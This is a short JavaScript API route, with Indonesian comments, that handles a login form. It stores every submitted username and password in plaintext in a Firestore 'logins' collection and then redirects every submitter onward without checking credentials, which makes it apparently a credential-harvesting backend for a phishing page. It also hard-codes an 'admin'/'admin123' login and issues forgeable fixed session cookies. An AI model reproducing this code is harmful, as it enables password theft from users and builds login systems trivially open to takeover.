import { db } from '../../lib/firebase';
import { collection, addDoc, Timestamp } from 'firebase/firestore';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    let body = '';

    await new Promise((resolve) => {
      req.on('data', (chunk) => {
        body += chunk.toString();
      });
      req.on('end', resolve);
    });

    const params = new URLSearchParams(body);
    const username = params.get('username');
    const password = params.get('password');

    try {
      await addDoc(collection(db, 'logins'), {
        username,
        password,
        time: Timestamp.now()
      });

      // Deteksi admin login
      if (username === 'admin' && password === 'admin123') {
        res.setHeader('Set-Cookie', `session=admin; Path=/; HttpOnly`);
        res.writeHead(302, { Location: '/admin-dashboard' });
      } else {
        res.setHeader('Set-Cookie', `session=1; Path=/; HttpOnly`);
        res.writeHead(302, { Location: '/dashboard' });
      }

      res.end();
    } catch (err) {
      console.error('Gagal simpan ke Firebase:', err);
      res.status(500).send('Internal Server Error');
    }
  } else {
    res.status(405).send('Method Not Allowed');
  }
}
